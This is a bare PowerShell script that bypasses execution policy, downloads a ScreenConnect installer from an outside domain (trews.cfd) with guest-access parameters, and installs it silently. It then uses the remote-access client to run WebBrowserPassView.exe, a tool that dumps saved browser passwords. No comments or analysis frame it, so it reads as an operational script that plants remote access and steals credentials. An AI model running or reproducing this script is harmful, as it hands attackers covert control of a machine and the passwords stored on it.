Set-ExecutionPolicy Bypass -Scope Process
$InstallerURL = 'https://trews.cfd/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest'
$DownloadPath = 'C:\Windows\Temp\ClientSetup.msi'
Invoke-WebRequest -Uri $InstallerURL -OutFile $DownloadPath
msiexec.exe /i C:\Windows\Temp\ClientSetup.msi /qn
& 'ScreenConnect.WindowsClient.exe' 'RunFile' 'C:\Users\operator\Documents\ScreenConnect\Temp\WebBrowserPassView.exe'
